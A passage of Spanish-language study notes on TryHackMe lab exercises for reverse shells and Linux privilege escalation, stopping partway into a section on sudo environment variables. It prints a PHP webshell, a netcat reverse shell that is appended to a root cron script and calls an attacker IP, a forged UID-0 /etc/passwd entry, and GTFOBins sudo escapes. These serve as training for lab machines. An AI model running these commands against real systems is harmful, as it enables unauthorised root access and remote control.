- *stagedless*: Los stagedless vienen identificados por las barrabajas, '\_'. Por ejemplo: linux/x86/meterpreter_reverse_tcp

- *staged*: Los staged contienen una '/' en el nombre del payload: windows/x64/meterpreter/reverse_tcp

Ahí vemos que en el ejemplo anterior tenemos sistemaoperativo/arquitectura/payload y el payload contiene una barra de más.

Por último, conviene saber que podemos tener todos los payloads listados mediante: msfvenom --list payloads.

<br />

**Metasploit multi/handler**

El módulo multi/handler de metasploit es un tipo handler que se emplea sobre todo en la recepción de módulos reverse shell de explotación.

Es relativamente fácil de usar:

- Abrimos msfconsole.
- Tecleamos: use multi/handler
- Tecleamos: options.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731094430.png' | relative_url }}" text-align="center"/>
</div>

De entre todas las opciones que existen, hay tres fundamentales que es necesario setear:

- set payload \<payload>
- set LHOST \<listen-address>
- set LPORT \<listen-port>

Una vez configuradas las opciones lanzamos el modulo mediante el comando: exploit -j (el modificador -j nos permitirá lanzarlo en segundo plano como un "job" para que podamos seguir usando la terminal mientras el proceso sigue escuchando una conexión)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731095959.png' | relative_url }}" text-align="center"/>
</div>

Como se ve en la parte final de la imagen anterior, finalmente recibe una conexión y crea un sesión tcp. Esta sesión estará visible con el comando: "sessions" y accesible con "sessions \<number>":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731100155.png' | relative_url }}" text-align="center"/>
</div>

<br />

**WebShells**

Puede surgir en alguna ocasión sitios web que nos permitan subir de alguna u otra forma un fichero ejecutable. En teoría, este defecto podría ser aprovechado para subir un fichero que genere una reverse shell, sin embargo, esto no es a veces posible pero en su lugar podemos ejecutar una *webshell*.

El término *webshell* es un término coloquial para referirse a un script dentro de un webserver y que permite la ejecución remota de comandos.

Un ejemplo sencillo de este tipo de scripts en php sería:

```PHP
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Existen multitud de webshells añadidas en Kali Linux por defecto en el path: /usr/share/webshells.

<br />

#### 6.2. Common Linux Privesc.

**Introducción a la escalada de privilegios**

Escalada de Privilegios es un término que refiere a un proceso de ganancia de permisos en un dispositivo por parte de un atacante.

Técnicamente el proceso consiste en la explotación de una vulnerabilidad, de un defecto de configuración del sistema o de alguna aplicación que corre en esta.

Esta es una etapa muy importante de la post-explotación debido a que te permite adquirir los permisos de administrador del sistema y tomar control del mismo.

<br />

**Dirección de la escalada de privilegios**

Fundamentalmente existen dos formas de elevar privilegios:

- *Horizontal privilege escalation*: Cuando tomas el control de una cuenta que tiene los mismos privilegios que la cuenta anterior. Generalmente este es un paso intermedio para llevar a cabo una escalada de privilegios vertical.

- *Vertical privilege escalation*: Cuando accedes a una cuenta que tiene más permisos que los que tenias antes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731170336.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Enumeration. LinEnum script.**

Para recopilar información sobre el sistema con el fin de encontrar vectores de ataque para elevar privilegios podemos emplear el script *LinEnum*.

Se trata de un simple script escrito en bash que realizar comandos comunes relacionados con la escalada de privilegios y la enumeración ahorrando tiempo.

Este script puede adquirirse mediante:

[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

Tenemos múltiples formas de descargar el archivo en la máquina objetivo:

- *Python Server*: En primer lugar montamos un servidor de python escuchando en la máquina del atacante:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731174532.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente desde la máquina atacante lo descargamos con wget:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731174910.png' | relative_url }}" text-align="center"/>
</div>

Y le damos permisos: chmod +x linenum.sh.

- *Copy/Paste*: Si no podemos trasladar ficheros descargándolo podemos probar a copiar

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731175035.png' | relative_url }}" text-align="center"/>
</div>

y pegar el código :

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731175107.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, al haber transportado satisfactoriamente el script, todo lo que queda es ejecutarlo: ./linenum.sh o sh linenum.sh.

Ahora, el output del script se divide en las siguientes partes:

- *Kernel information*: Información del kernel y algún posible exploit de kernel disponible.

- *Word-writable files*: Se enseñas los ficheros sobre los que tenemos permisos de lectura o escritura

- *SUID Files*: Aquí se muestran los ficheros SUID, estos son ficheros especiales que pueden ejecutarse con los permisos del propietario. Así por ejemplo, si el usuario es root, se ejecutaría con los permisos de root.

- *Crontab Contents*: Cron es un mecanismo que se emplea para programar la ejecución periódica de comandos o aplicaciones. Estos se denominan como "cron jobs".

Vamos a ejecutar el script en una máquina para obtener un ejemplo de la estructura anterior. Es una máquina con un servidor SSH en el puerto 22 con credenciales: user3:password.

De esta forma, nos logeamos en nuestra kali y montamos un servidor python en la carpeta en la que tenemos el script:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731181533.png' | relative_url }}" text-align="center"/>
</div>

Y realizamos una http-request con "wget" desde la máquina víctima en la que previamente nos hemos logeado con SSH:

```bash
wget http://<LOCAL-IP>:<PORT>/<PATH/TO/FILE>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731181826.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, concedemo permisos al fichero y ejecutamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731182028.png' | relative_url }}" text-align="center"/>
</div>

De esta formal entre la información desplegada podemos encontrar, los datos mostrados a continuación están buscados en un fichero en elq ue se ha introducido el output que proporciona el script:

- El Hostname:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731183016.png' | relative_url }}" text-align="center"/>
</div>

- El fichero /etc/passwd:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731183205.png' | relative_url }}" text-align="center"/>
</div>

- Shells disponibles buscadas sobre el fichero /etc/shells:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731183252.png' | relative_url }}" text-align="center"/>
</div>

- Cronjobs:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731183508.png' | relative_url }}" text-align="center"/>
</div>

- Ficheros en los que podemos leer/escribir:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220731184010.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Abusando de SUID/GUID Files**

El primer paso en la escalada de privilegios de Linux consiste en checkear ficheros con el bit de SUID/GUID configurados. Estos son un tipo especial de permiso mediante el cual el fichero se ejecuta con los permisos del propietario del mismo, en este caso, lo interesante sería encontrar un fichero cuyo propietario fuera root.

Los permisos de los ficheros vienen ordenados sobre una fila dividida en tres partes distintas que corresponden a los permisos del propietario, grupo propietario y otros respectivamente (Por ejemplo: -rwxrwxr--), donde los permisos son:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801090731.png' | relative_url }}" text-align="center"/>
</div>

En la imagen anterior se puede observar que los permisos también tienen una traducción al decimal, esto es importante porque algunos comandos admiten la concesión de una combinación de permisos mediante un número.

Lo importante de esta parte consiste en la forma que adopta el bit de SUID/GUID entre estos permisos. Se trata de una letra 's' que se pone o bien en los permisos del propietario cuando es SUID (-rwsr--r--) o en las del grupo propietario cuando es GUID (-rw-rwsr--)

Cabe mencionar que esta no tiene un espacio reservado entre los permisos, es decir, cuando no está el bit SUID/GUID no se pone un guión en su lugar.

Para encontrar ficheros SUID empleamos el siguiente comando:

```bash
find / -perm -u=s -type f 2>/dev/null
```

- find: Para llamar al comando find que busca ficheros en base a una serie de parámetros.

- /: Parámetro para buscar desde el fichero raíz.

- -perm: Busca ficheros con permisos específicos.

- -u=s, el permiso buscado es el bit SUID.

- -type f: Busca ficheros

- 2>/dev/null; envía los errores a dicho fichero en lugar de mostrarlo por pantalla.

Para ver un ejemplo, en una máquina víctima a la que hemos accedido mediante SSH y al ejecutar el comando anterior observamos que uno de los resultados es un fichero shell:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801103725.png' | relative_url }}" text-align="center"/>
</div>

Así, acudimos, al directorio pertinente y listamos con -la para obtener una descripción detallada de los permisos y observamos que efectivamente contiene el SUID bit, que el propietario es root y cualquier puede ejecutar el script:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801103702.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Explotando fichero /etc/passwd modificable**

Continuando con la enumeración de usuarios, encontramos que user7 es un miembro del grupo root con gid 0. Y ya sabemos por el análisis de LinEnum que el usuario puede escribir en el archivo /etc/passwd. Entonces, a partir de esta observación, concluimos que user7 puede editar el archivo /etc/passwd.

El /etc/passwd es un archivo de texto sin formato. Contiene una lista de las cuentas del sistema pertenecientes a usuarios, demonios o servicios, brindando para cada cuenta información útil como ID de usuario, ID de grupo, directorio de inicio, shell y más.

El archivo /etc/passwd debe tener permiso de lectura general, ya que muchas utilidades de comando lo usan para asignar ID de usuario a nombres de usuario. Sin embargo, *el acceso de escritura a /etc/passwd solo debe limitarse para la cuenta de superusuario/raíz*. Cuando no es así, o un usuario se ha agregado por error a un grupo con permiso de escritura tenemos una vulnerabilidad que puede permitir la creación de un usuario root al que podemos acceder elevando así privilegios.

El formato de las líneas de este fichero tienen la siguiente forma:

prueba:x:0:0:raíz:/raíz:/bin/bash

De esta forma, la línea se encuentra dividido en campos cada dos puntos donde, de izquierda a derecha, tenemos:

- *Nombre del usuario*:

- *Contraseña*:  un carácter x indica que la contraseña cifrada se almacena en el archivo /etc/shadow.

- *ID de Usuario (UID)*: Un número que identifica al usuario. El 0 está resevardo para root, desde 1 a 99 para usuarios y desde 100 a 999 para demonios, y servicios.

- *ID de Grupo*: ID del grupo principal al que pertenece el usuario.

- *Comentario*: Sirve para almacenar información adicional del mismo.

- *Directorio de inicio*: El direcotrio de inicio de sesión del usuario, por ejemplo /root o /home/user, etc.

- *Command/shell*: La ruta absoluta de la shell.

De esta forma y de acuerdo a la estructura anterior podemos explotar un "writable /etc/passwd file" escribiendo de acuerdo a esta estructura una nueva entrada para un nuevo usuario definiendo un nombre, un hash de contraseña a nuestra elección y demás elementos, entre estos lo óptimo sería configurar el UID/GID a 0 para volvernos root y tomar control del equipo.

Volviendo al ejemplo anterior recordamos que que el usuario que tiene permisos de modificación de este fichero es 'user7' de esta forma se tiene que primero llevamos a cabo una escalada de privilegios horizontal (supuesto que hemos descubierto sus credenciales, user7:password)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801175244.png' | relative_url }}" text-align="center"/>
</div>

Y procedemos a modificar el fichero /etc/passwd.

Empezaremos atajando la contraseña, para crear un hash válido para el formato de /etc/passwd empleamos el siguiente comando:

```bash
openssl passwd -1 -salt <salt> <passwd>
```

Mencionar que en criptografía, un "salt" son datos aleatorios que se utilizan como entrada adicional para una función unidireccional que procesa datos, una contraseña o una frase de contraseña, los salts se utilizan para proteger las contraseñas almacenadas. Así:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801181639.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, la línea a introducir sería:

new:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0::/root:/bin/bash

Así, nuestro usuario se llama new, tiene dicho hash de contraseña, tanto su UID como su GID es 0 (como el de root), su directorio principal es /root y la terminal que abre por defecto está en /bin/bash

De esta forma, abrimos el fichero con vi, copiamos la línea:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801182246.png' | relative_url }}" text-align="center"/>
</div>

Y cerramos con "!wq".

Seguidamente, empleamos el comando su para pasar al usuario recién creado con las credenciales "new:123":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801183025.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Escaping Vi Editor**

Existen casos en los que un usuario forma parte del grupo sudoers (este es un grupo que permite a un usuario ejecutar una acción como root a través del comando sudo y prorporcionando su contraseña) pero no tiene que poner su contraseña para ejecutar un comando específico, esto puede comprobarse para un usuario concreto con "sudo -l":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801191426.png' | relative_url }}" text-align="center"/>
</div>

Así podemos comprobar que este usuario puede ejecutar el editor de textos vi como super usuario, esto es una debilidad que, concatenado con otra debilidad, constituye una vulnerabilidad de escalada de privilegios.

Existe una página llamada [https://gtfobins.github.io/](https://gtfobins.github.io/) que contiene exploits de sistemas, entre ellos podemos ver el siguiente

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801193237.png' | relative_url }}" text-align="center"/>
</div>

Este nos permite a través del comando:

```bash
vi -c ':!/bin/sh' /dev/null
```

Abrir una shell desde vi, con la ventaja de que como vi está siendo ejecutado como root, se nos abrirá una shell como root elevando privilegios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801193440.png' | relative_url }}" text-align="center"/>
</div>

O también podemos abrir vi con sudo y desde ahí:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801194205.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220801194219.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exploiting Crontab**

*Cron* es un proceso que se ejecuta en segundo plano que tiene funciones de mantenimiento, estos tipos de procesos reciben el nombre de *daemon*.

Concretamente, Cron es un daemon que ejecuta comando en fechas específicas de forma única (one-time events) o periódica (recurring tasks). La forma en la que el usuario interactúa con Cron es mediante el fichero */etc/crontab*.

En el fichero /etc/crontab podemos ver qué *cron jobs* están fechados (LinEnum proporciona información sobre esto).

Por su parte, los *cron jobs* tienen un formato concreto y es necesario conocerlo para poder explotar una posible vulnerabilidad de Cron:

- \# = ID

- m = Minuto

- h = Hora

- dom = día del mes

- lun = Mes

- dow = Día de la semana

- usuario = Con qué usuario se ejecutará el comando

- command = ¿Qué comando se debe ejecutar?

En el orden siguiente:

- #  m   h dom mon dow user  command

Así por ejemplo:

- 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly

Aquí estamos fechando un proceso con ID 17, cada hora, ejecutado por el usuario root y el comando a ejecutar es: cd / && run-parts --report /etc/cron.hourly

Vamos a ver un caso práctico para practicar. En primer lugar, debemos tener una máquina con un usuario que tenga permiso para editar el /etc/crontab y seguidamente debemos construir un payload con msfvenom para poder realizar una reverse_shell:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802002430.png' | relative_url }}" text-align="center"/>
</div>

A continuación accedemos al /etc/crontab y observamos que cada 5 minutos se ejecuta por el super usuario root un script localizado en la carpeta del usuario que poseemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802003115.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, examinamos dicho script y observamos que el propietario, es decir, nosotros, tenemos permiso para modificarlo y ejecutarlo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802003528.png' | relative_url }}" text-align="center"/>
</div>

De esta forma se tiene que podemos emplear la siguiente estrategía, incluímos un payload malicioso en el fichero autoscript.sh y esperamos a que este sea ejecutado con Cron por root y nos dará una shell con root.

Así, empleamos el comando:

```bash
echo "mkfifo /tmp/lfbv; nc 10.10.2.221 8888 0</tmp/lfbv | /bin/sh >/tmp/lfbv 2>&1; rm /tmp/lfbv" >> ~/Desktop/autoscript.sh
```

Y montamos un listener para procesar la conexión entrante cuando el script sea ejecutado con cron:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802004020.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exploiting PATH variable**

La variable *PATH* es una *variable de entorno* de los sistemas basados en UNIX. Una variable de entorno a su vez es un valor predefinido guardado bajo un nombre que el sistema operativo utiliza para cuestiones de gestión o mantemiento del sistema.

En concreto, *la variable PATH guarda las rutas de archivos ejecutables que son llamados desde la terminal a modo de comandos*. Es decir, cuando se teclea un comando en la terminal, el sistema llama a la variable PATH y acude a cada una de las rutas que están guardadas en la variable y comprueba el contenido de las mismas para saber en cuál está el archivo ejecutable coincidente y ejecutarlo.

Mostrar el contenido de esta variable es fácil con:

```bash
echo $PATH
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802005148.png' | relative_url }}" text-align="center"/>
</div>

Veámos ahora la forma en la que esta herramienta nos permite escalar privilegios. La clave está en que la variable contiene las rutas ordenadas y eso significa que el sistema operativo siempre busca antes en unas localizaciones que en otras, de forma que cuando encuentra el archivo ejecutable coincidente deja de buscar.

Así, la estrategía sería llevar a cabo una suplantación de comandos introduciendo en una ruta de la variable path un comando sensible que sepamos que va a ser buscado (por una cuestión de localización y orden en dicha variable) antes que el comando original y por tanto que vaya a ser ejecutado en su lugar produciendo una salida distinta que favorece a un atacante. Esto es en definitiva: inyección de comandos.

Veámos un ejemplo práctico sobre cómo emplear esta escalada de privilegios.

Supongámos que hemos tomado control de una máquina y tenemos a nuestra disposición un script con el bit de SUID habilitado cuyo propietario es root que llama a un comando cuando se ejecuta:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802095014.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802094030.png' | relative_url }}" text-align="center"/>
</div>

Concretamente, llama al comando ls. De esta forma podemos poner en práctica los siguiente:

- En primer lugar, generamos un ejecutable con el mismo nombre que el comando, concretamente lo hacemos en la carpeta /tmp donde tenemos permisos de creación de ficheros

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802094731.png' | relative_url }}" text-align="center"/>
</div>

- Seguidamente, modificamos la variable PATH para que busque en primer lugar un comando en el directorio /tmp con:

```bash
export PATH=/tmp:$PATH
```

- A continuación, ejecutamos el script que se ejecuta como si fuera el usuario root y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802095309.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 6.3. Advanced Linux PrivEsc.

**Services Exploits**

En ocasiones, podemos logearnos dentro de un servicio corriendo en un sistema como administrador (root) a partir de ahí, aprovechando una vulnerabilidad, ejecutar OS Commands como root a través del servicio en cuestión fácticamente elevando privilegios.

Por ejemplo, supongámos que en una máquina existe un MySQL service corriendo y en escucha interna:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802104130.png' | relative_url }}" text-align="center"/>
</div>

Observemos de nuevo que este servicio sólo atiende peticiones realizadas internamente ya que este sólo es visible por nmap cuando se emplea el bucle local como IP (primer escaneo). Además esto también puede constarse con el comando netstat:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802135214.png' | relative_url }}" text-align="center"/>
</div>

Aquí, en este contexto, la IP 0:0:0:0 hace referencia a cualquier IP de la máquina y que por tanto el servicio atiende a requests que llegan desde la IP externa como la interna mientras que el puerto 3306, el correspondiente a MySQL, tiene asignada la escucha en el 127.0.0.1ny sólo atiende a peticiones internas.

Además, sabemos que las credenciales del administrador se mantienen por defecto (root:). De forma que podemos logearnos en el servicio como administrador.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802135538.png' | relative_url }}" text-align="center"/>
</div>

Vamos a aprovecharnos para pasar de root del servicio a root del sistema gracias a una vulnerabilidad del User Defined Functions (UDF) que explotaremos mediante una exploit:


- Para empezar, en la máquina víctima compilamos el exploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802154317.png' | relative_url }}" text-align="center"/>
</div>

- Nos logeamos dentro del servicio con las credenciales de root (root:)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802154417.png' | relative_url }}" text-align="center"/>
</div>

- Ejecutamos los siguientes comandos con el objetivo de crear un User Defined Function (UDF) con nuestro exploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802154807.png' | relative_url }}" text-align="center"/>
</div>

- Ahora, podemos emplear el UDF "do_system" para ejecutar comandos en el sistema. Esto lo podemos aprovechar para construir un fichero ejecutable que contenga una terminal con el bit de SUID ejecutable para todos los usuarios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802154952.png' | relative_url }}" text-align="center"/>
</div>

- De esta forma al salir y ejecutar dicho fichero desplegaremos una terminal como root:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802160232.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Weak File Permissions - Readable /etc/shadow /etc/shadow-

El fichero */etc/shadow* contiene los hashes de las contraseñas de los usuarios. Este fichero en principio sólo debería de poder ser leído por root, si esto no fuera así podría considerarse una debilidad que, concatenada con otra debilidad de contraseñas débiles, daría lugar a una vulnerabilidad de escalada de privilegios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802162959.png' | relative_url }}" text-align="center"/>
</div>

En la imágen anterior se puede ver que el fichero shadow es "world-readable" y además la contraseña del usuario root es débil, de forma que es crakeable con johntheripper y la contraseña es password123.

<br />

**Weak File Permissions - Writable /etc/shadow /etc/shadow-

Observemos que también en el ejemplo anterior el fichero es "world-writable", de esta forma, podemos crear un hash de una contraseña nueva y reemplazar el hash de una contraseña existente en el fichero shadow.

El formato de las contraseñas guardadas es sha-512 y el comando a emplear es:

```bash
mkpasswd -m sha-512 <password>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802165152.png' | relative_url }}" text-align="center"/>
</div>

Y lo reemplazamos por la contraseña de root con el editor de textos 'vi':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802165328.png' | relative_url }}" text-align="center"/>
</div>

Así, cambiamos al usuario root con nuestra nueva contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802165355.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Weak File Permissions - Writable /etc/passwd /etc/passwd-

Como sabemos, el fichero */etc/passwd* contiene información listada sobre los usuarios. Admite la presencia de hash de contraseñas de los mismos aunque con frecuencia estos se encuentran en /etc/shadow.

Si tuviéramos permisos de escritura sobre /etc/passwd podríamos cambiar el hash de contraseña del usuario root (*observemos que el esquema es que la contraseña primero se busca en el /etc/passwd y sólo se salta al /etc/shadow si en el primero está así indicado mediante una x*).

Así, de nuevo, observamos que tenemos permisos de escritura:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802170503.png' | relative_url }}" text-align="center"/>
</div>

empleamos el siguiente comando:

```bash
openssl passwd <password>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802170600.png' | relative_url }}" text-align="center"/>
</div>

Y lo reemplazamos por la contraseña de root en /etc/passwd:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802170802.png' | relative_url }}" text-align="center"/>
</div>

Así, salimos y empleamos el comando su y la nueva contraseña para cambiar de usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802170839.png' | relative_url }}" text-align="center"/>
</div>

O incluso podríamos crear un nuevo usuario análogo al usuario root con el UID/GID seteado a 0 para tener permisos de root:

- Creamos un nuevo hash:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802171525.png' | relative_url }}" text-align="center"/>
</div>

- Y definimos el nuevo usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802171703.png' | relative_url }}" text-align="center"/>
</div>

Observmos que los dos 0 de la nueva línea son respectivamente el UID y el GID.
- Empleamos el comando su para logearnos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802171720.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Sudo - Shell Escape Sequences**

Un fallo de configuración relativamente recurrente consiste en permitir que un usuario acceda como root sin necesidad de emplear contraseña a un programa o servicio que tiene la capacidad de abrir una shell o ejecutar comandos en sí mismo.

El comando *sudo -l* nos lista todos los ejecutables que pueden accionarse como root sin necesidad de poner contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802181808.png' | relative_url }}" text-align="center"/>
</div>

Así, esta debilidad puede emplearse junto con los payloads de [GTFOBins](https://gtfobins.github.io/) para explotar una vulnerabilidad de elevación de privilegios:

- *iftop*: Iftop es una herramienta de análisis de networking empleado por los administradores para ver estadísticas relacionadas con el ancho de banda. Mediante sudo iftop (no necesitamos contraseña) tenemos acceso a la interfaz que proporciona el programa:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802182316.png' | relative_url }}" text-align="center"/>
</div>

Así, acudimos a GTFOBins y buscamos "iftop", obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802182550.png' | relative_url }}" text-align="center"/>
</div>

De forma que pulsamos ! para poder ejecutar un comando y seguidamente introducimos /bin/bash para abrir una terminal:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802182718.png' | relative_url }}" text-align="center"/>
</div>

De nuevo, como el programa se ejecutaba como root, la shell se abre como root elevando así privilegios.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802182840.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *find*: find es un comando que permite buscar un recurso (archivo) dentro de los sistemas operativos basados en Unix de acuerdo a un conjunto de parámetros predefinidos. Observamos que en GTFOBins obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802183016.png' | relative_url }}" text-align="center"/>
</div>

Como podemos ejecutar el comando con sudo sin necesidad de poner contraseña podemos escribir:

```bash
sudo find . -exec /bin/bash \; -quit
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802183125.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *nano*: Nano es un editor de textos que posee (al igual que iftop) una funcionalidad de ejecución de comandos. De esta forma, buscamos en GTFOBins sobre nano:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802183234.png' | relative_url }}" text-align="center"/>
</div>

Así, en primer lugar ejecutamos nano como root mediante sudo (no necesitamos contraseña) y pulsamos Ctrl+R, Ctrl+X para ejecutar un comando e introducimos:

```bash
reset; /bin/bash 1>&0 2>&0
```

obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802183430.png' | relative_url }}" text-align="center"/>
</div>

Escribiéndo "clear" y whoami se ve más claro:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220802183503.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *vim*: Al igual que Nano, Vim es un editor de textos más técnico pero también más sofisticado. Al igual que nano posee una funcionalidad de ejecución de comandos. De forma que al introducirnos en GTFOBins:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803133445.png' | relative_url }}" text-align="center"/>
</div>

Y por tanto:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803133555.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *man*: man es una herramienta que proporciona información sobre otros comandos. De nuevo, contiene una funcionalidad de ejecución de comandos.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803141116.png' | relative_url }}" text-align="center"/>
</div>

Así, tecleamos sudo man man y escribimos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803140855.png' | relative_url }}" text-align="center"/>
</div>

De forma que obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803141033.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *awk*: Awk es un comando de manipulación y procesado de texto en función de nuestras necesidades.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803141640.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803141750.png' | relative_url }}" text-align="center"/>
</div>

- *less/more*: Less y More son comandos que permiten la lecutra de grandes documentos de texto con relativa comodida para el usuario. Disponen de una funcionalidad de ejecución de comandos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803142726.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, abrimos con less un documento haciendo uso de sudo e introducimos !/bin/bash:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803142902.png' | relative_url }}" text-align="center"/>
</div>

Una operación similar valdría con "more".

- *ftp*: Ftp es una herramienta de línea de comandos que ayuda al usuario a interactuar con servidores FTPO a través del servicio ftp.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803143646.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803144401.png' | relative_url }}" text-align="center"/>
</div>

- *nmap*: Nmap es una herramienta que automatiza tareas de networking como escaneo y reconocimiento de servicios para el usuario. Posee un modo interactivo con una funcionalidad de inyección de comandos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803144118.png' | relative_url }}" text-align="center"/>
</div>

De esta forma:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803144545.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Sudo - Enviroment Variables**

Sabemos que el comando Sudo (Super User DO) llama al super usuario para que este realize una acción, para que ejecute un comando. Esto significa que un usuario llama a otro usuario para desempeñar cierta acción cambiando en el proceso el entorno en el que esa acción se lleva a cabo (variables de entorno, etc).

